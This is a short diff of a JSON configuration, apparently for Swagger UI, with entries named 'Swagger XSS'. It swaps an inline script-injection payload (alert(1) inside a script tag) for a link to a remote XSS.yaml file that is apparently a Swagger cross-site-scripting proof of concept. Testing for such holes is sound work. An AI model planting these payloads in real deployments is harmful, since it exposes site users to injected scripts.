@@ -1,9 +1,9 @@
 
 {
-    "url": "javasrcript:alert(1)"><script>alert(1)</script>",
+    "url": "https://raw.githubusercontent.com/farid007/Swagger-XSS/main/XSS.yaml",
     "urls": [
         {
-            "url": "javasrcript:alert(1)"><script>alert(1)</script>",
+            "url": "https://raw.githubusercontent.com/farid007/Swagger-XSS/main/XSS.yaml",
             "name": "Swagger XSS"
         }
     ]
